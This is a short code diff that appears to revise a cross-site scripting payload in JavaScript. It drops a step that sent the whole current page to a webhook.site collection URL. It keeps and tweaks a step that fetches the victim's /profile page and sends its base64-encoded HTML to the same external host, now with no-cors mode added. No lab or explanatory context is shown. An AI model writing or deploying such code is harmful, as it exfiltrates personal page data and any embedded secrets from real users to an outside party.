@@ -1,12 +1,7 @@
-// Send current page
-var current = document.documentElement.outerHTML;
-fetch('https://webhook.site/04e02681-01c6-43b0-adf8-8b311acc9b60/?current=' + 
-      btoa(current));
-
 // Also fetch and send profile page
 fetch("/profile")
     .then(response => response.text())
     .then(html => {
         fetch('https://webhook.site/04e02681-01c6-43b0-adf8-8b311acc9b60/?profile=' + 
-              btoa(html));
+              btoa(html), {mode: 'no-cors'});
     });
